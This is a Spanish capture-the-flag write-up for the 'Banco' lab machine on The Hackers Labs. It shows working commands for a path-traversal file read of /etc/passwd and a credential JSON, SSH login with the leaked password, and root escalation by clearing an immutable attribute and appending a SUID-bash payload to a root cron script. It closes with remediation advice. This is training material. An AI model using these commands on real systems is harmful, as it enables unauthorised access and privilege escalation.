# THL - Banco | Writeup Técnico

**Plataforma:** The Hackers Labs (THL)
**Máquina:** Banco
**IP:** 10.0.2.9
**Dificultad:** Media
**Autor:** Luis Felipe Arana Guerra (felipea333)

---

## 1. Reconocimiento

### 1.1 Escaneo de puertos con Nmap

```bash
nmap -sC -sV -p- --min-rate 5000 -oN nmap_banco.txt 10.0.2.9
```

**Resultado:**

```
PORT   STATE SERVICE    VERSION
22/tcp open  tcpwrapped
80/tcp open  tcpwrapped
|_http-server-header: Apache/2.4.66 (Debian)
```

Solo dos puertos abiertos: SSH (22) y un servidor web Apache (80). El vector de entrada más probable está en la aplicación web.

---

## 2. Enumeración web

### 2.1 Inspección del contenido

```bash
curl -s http://10.0.2.9/ | head -50
```

La web simula el portal corporativo del "Banco de España", con una pantalla de login y una sección de descarga de informes en PDF.

### 2.2 Formulario de descarga sospechoso

```bash
curl -s http://10.0.2.9/ | grep -A 20 "<form"
```

Se identificó un formulario:

```html
<form id="pdfForm" method="POST" action="descargar.php" target="_blank">
    <input type="hidden" name="archivo" value="sobrenosotros.pdf">
    <button type="submit">Descargar Informe (PDF)</button>
</form>
<div class="info-lfi">...</div>
```

La clase CSS `info-lfi` es una pista deliberada: apunta a una vulnerabilidad de tipo **Local File Inclusion**.

### 2.3 Enumeración de directorios

```bash
gobuster dir -u http://10.0.2.9/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,js -t 50 -o gobuster_banco.txt
```

Resultados relevantes:

```
config.php    (Status: 200) [Size: 0]
index.html    (Status: 200) [Size: 24605]
javascript    (Status: 301)
```

---

## 3. Explotación — LFI en `descargar.php`

### 3.1 Confirmación del comportamiento del endpoint

```bash
curl -s -X POST http://10.0.2.9/descargar.php -d "archivo=sobrenosotros.pdf" -o test.pdf
file test.pdf
```

El archivo devuelto es texto plano, no un PDF real: `descargar.php` simplemente lee y sirve el contenido del archivo indicado en el parámetro `archivo`, sin generarlo dinámicamente. Esto es un fuerte indicio de LFI.

### 3.2 Path Traversal

```bash
curl -s -X POST http://10.0.2.9/descargar.php -d "archivo=../../../../etc/passwd"
```

**Resultado:** lectura exitosa de `/etc/passwd`, revelando el usuario del sistema `wvverez` (UID 1001, `/bin/bash`).

### 3.3 Lectura de código fuente de la aplicación

Al probar el wrapper `php://filter`, la aplicación reveló mediante un mensaje de debug que concatena una ruta base fija:

```
Ruta buscada: /var/www/html/informes/php://filter/...
```

Esto confirma que la ruta base es `/var/www/html/informes/`, y que `descargar.php` reside en `/var/www/html/`. Se aprovechó esta información para leer archivos relativos con `../`:

```bash
curl -s -X POST http://10.0.2.9/descargar.php -d "archivo=../config.php"
```

**Resultado — código fuente de `config.php`:**

```php
<?php
define('DB_FILE', __DIR__ . '/dbsuperscretinfact.json');
function db_read() {
    if (!file_exists(DB_FILE)) file_put_contents(DB_FILE, json_encode(['users' => []]));
    return json_decode(file_get_contents(DB_FILE), true);
}
...
?>
```

Se revela el nombre de un archivo de "base de datos" en formato JSON: `dbsuperscretinfact.json`.

### 3.4 Extracción de credenciales

```bash
curl -s -X POST http://10.0.2.9/descargar.php -d "archivo=../dbsuperscretinfact.json"
```

El JSON contiene un listado de usuarios con contraseñas de aspecto uniforme (señuelos), salvo el usuario `wvverez`, que en lugar de depender de una contraseña de aplicación, referenciaba una clave SSH:

```json
{
    "id": 3,
    "username": "wvverez",
    "password": "dasjbdaDASJDASDA11E1DAJDQA",
    "role": "user",
    "ssh_key": "/home/wvverez/.ssh/id_rsa"
}
```

### 3.5 Acceso inicial vía SSH

La clave privada no era legible por el proceso web (permisos `.ssh` restringidos a 700), pero la contraseña extraída del JSON sí era válida para autenticación SSH directa:

```bash
ssh wvverez@10.0.2.9
# contraseña: dasjbdaDASJDASDA11E1DAJDQA
```

Acceso concedido como `wvverez`.

---

## 4. Flag de Usuario

```bash
whoami
id
cat ~/user.txt
```

```
wvverez
uid=1001(wvverez) gid=1001(wvverez) grupos=1001(wvverez),100(users)
```

**🚩 Flag de Usuario:**
```
THL{dadDADADASJDANJDSDADLASasadanjdaibda}
```

---

## 5. Escalada de Privilegios

### 5.1 Enumeración

Se comprobó acceso `sudo` (denegado) y se enumeraron binarios SUID estándar (sin hallazgos anómalos). La enumeración de directorios con permisos de escritura reveló algo importante:

```bash
find / -writable -type d 2>/dev/null | grep -vE "^/proc|^/sys"
```

```
/var/www/html
/var/www/html/informes
```

El propio usuario `wvverez` era dueño de los archivos de la aplicación web, incluido `descargar.php` y `config.php`.

### 5.2 Hallazgo del vector de escalada

```bash
ls -la /usr/local/bin/
```

```
-rwxrwxrwx  1 root root   429 jun  7 12:32 backup.sh
```

Un script propiedad de **root** con permisos **777** (escribible por cualquier usuario). Su contenido:

```bash
#!/bin/bash
# backup.sh - Script para respaldar db.json
BACKUP_DIR="/var/backups"
SOURCE_FILE="/var/www/html/db.json"
DEST_FILE="$BACKUP_DIR/db_backup_$(date +'%Y%m%d_%H%M%S').json"
LOG_FILE="/var/log/backup.log"
mkdir -p "$BACKUP_DIR"
cp "$SOURCE_FILE" "$DEST_FILE" 2>/dev/null
echo "$(date) - Backup creado: $DEST_FILE" >> "$LOG_FILE"
ls -t $BACKUP_DIR/db_backup_*.json 2>/dev/null | tail -n +11 | xargs rm -f 2>/dev/null
```

Revisando `/var/log/backup.log`, se confirmó que el script se ejecuta **automáticamente cada 60 segundos como root**, aunque no se identificó una entrada explícita en crontab ni en systemd timers accesibles al usuario.

### 5.3 Obstáculo: atributo inmutable

Al intentar modificar el script:

```bash
echo 'cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash' >> /usr/local/bin/backup.sh
# -bash: /usr/local/bin/backup.sh: Operación no permitida
```

Se comprobó el atributo extendido del archivo:

```bash
lsattr /usr/local/bin/backup.sh
# ----i---------e------- /usr/local/bin/backup.sh
```

El flag `i` indica que el archivo tiene el **atributo inmutable** (`chattr +i`), que impide su modificación incluso teniendo permisos de escritura 777.

### 5.4 Bypass del atributo inmutable

Sorprendentemente, el usuario `wvverez` tenía permisos suficientes para retirar el atributo:

```bash
chattr -i /usr/local/bin/backup.sh
lsattr /usr/local/bin/backup.sh
# --------------e------- /usr/local/bin/backup.sh
```

### 5.5 Inyección del payload

Con el atributo inmutable retirado, se inyectó un payload que copia `/bin/bash` con el bit SUID activado:

```bash
echo 'cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash' >> /usr/local/bin/backup.sh
```

Tras esperar a la siguiente ejecución automática (≤60 segundos):

```bash
ls -la /tmp/rootbash
# -rwsr-sr-x 1 root root 1265648 jul  5 18:56 /tmp/rootbash
```

El bit SUID (`s`) confirma que el binario se ejecutará con privilegios efectivos de root.

### 5.6 Escalada final

```bash
/tmp/rootbash -p
id
```

```
uid=1001(wvverez) gid=1001(wvverez) euid=0(root) egid=0(root) grupos=0(root),100(users),1001(wvverez)
```

---

## 6. Flag de Root

```bash
cat /root/root.txt
```

**🚩 Flag de Root:**
```
THL{dadDADADASJDadfgsdgag50g50}
```

---

## 7. Resumen de la cadena de explotación

| Fase | Técnica | Detalle |
|---|---|---|
| Reconocimiento | Nmap | SSH (22) y Apache (80) |
| Enumeración | curl + Gobuster | Formulario de descarga PDF, `config.php` accesible |
| Explotación inicial | **LFI / Path Traversal** | `descargar.php?archivo=` sin sanitización |
| Post-explotación | Lectura de archivos sensibles | `config.php` → nombre del "JSON DB" → credenciales |
| Acceso inicial | SSH con credenciales filtradas | Usuario `wvverez` |
| Escalada de privilegios | Script SUID-root con permisos 777 + bypass de `chattr +i` | `/usr/local/bin/backup.sh` ejecutado cada 60s como root |

## 8. Recomendaciones de remediación

1. **Sanitizar el parámetro `archivo`** en `descargar.php`: usar listas blancas de nombres de archivo permitidos y `basename()` para eliminar secuencias de traversal.
2. **No almacenar credenciales en texto plano** en archivos accesibles desde el directorio web (`dbsuperscretinfact.json`).
3. **Revisar permisos de scripts ejecutados por root**: `/usr/local/bin/backup.sh` no debería tener permisos de escritura para otros usuarios (777 → 700, propietario root).
4. **No depender solo de `chattr +i`** como control de seguridad: es una mitigación débil si el usuario no privilegiado puede revertirla (revisar capacidades del sistema de archivos y CAP_LINUX_IMMUTABLE).
5. **Auditar tareas programadas ocultas**: la ejecución periódica del script no era visible en `crontab -l` ni en `systemctl list-timers`, dificultando su detección — se recomienda centralizar y documentar toda automatización con privilegios elevados.
